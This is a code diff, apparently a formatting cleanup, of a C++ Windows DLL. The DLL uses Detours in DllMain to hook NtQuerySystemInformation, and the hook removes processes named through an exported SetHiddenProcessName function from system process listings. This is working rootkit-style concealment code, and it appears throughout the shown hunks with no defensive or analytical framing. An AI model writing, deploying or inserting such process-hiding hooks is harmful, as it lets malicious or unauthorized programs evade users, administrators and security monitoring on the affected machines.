@@ -7,12 +7,10 @@ static std::vector<std::wstring> g_hiddenProcesses;
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
-typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
-    SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    PVOID SystemInformation,
-    ULONG SystemInformationLength,
-    PULONG ReturnLength
-);
+typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(SYSTEM_INFORMATION_CLASS SystemInformationClass,
+                                                    PVOID SystemInformation,
+                                                    ULONG SystemInformationLength,
+                                                    PULONG ReturnLength);
 
 NtQuerySystemInformation_t origNtQuerySystemInformation = NULL;
 
@@ -21,23 +19,21 @@ static bool ShouldHideProcess(const WCHAR* processName) {
     if (processName == NULL || g_hiddenProcesses.empty()) {
         return false;
     }
-    
+
     for (const auto& hiddenProc : g_hiddenProcesses) {
         if (StrStrIW(processName, hiddenProc.c_str()) != NULL) {
             return true;
         }
     }
-    
+
     return false;
 }
 
-NTSTATUS NTAPI HookedNtQuerySystemInformation(
-    SYSTEM_INFORMATION_CLASS SystemInformationClass, 
-    PVOID SystemInformation, 
-    ULONG SystemInformationLength, 
-    PULONG ReturnLength) 
-{
-    NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
+NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
+                                              PVOID SystemInformation,
+                                              ULONG SystemInformationLength, PULONG ReturnLength) {
+    NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation,
+                                                   SystemInformationLength, ReturnLength);
 
     if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
         PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
@@ -66,7 +62,7 @@ NTSTATUS NTAPI HookedNtQuerySystemInformation(
             if (!isHidden) {
                 pPrevious = pCurrent;
             }
-            
+
             pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
         }
     }
@@ -79,16 +75,16 @@ extern "C" __declspec(dllexport) BOOL SetHiddenProcessName(const wchar_t* proces
         g_hiddenProcesses.clear();
         return TRUE;
     }
-    
+
     std::wstring procName = processName;
-    
+
     // Check if already in list
     for (const auto& proc : g_hiddenProcesses) {
         if (_wcsicmp(proc.c_str(), procName.c_str()) == 0) {
             return TRUE;
         }
     }
-    
+
     g_hiddenProcesses.push_back(procName);
     return TRUE;
 }
@@ -112,9 +108,10 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
     switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH:
         DisableThreadLibraryCalls(hModule);
-        
-        origNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
-        
+
+        origNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(
+            GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");
+
         if (origNtQuerySystemInformation != NULL) {
             DetourTransactionBegin();
             DetourUpdateThread(GetCurrentThread());
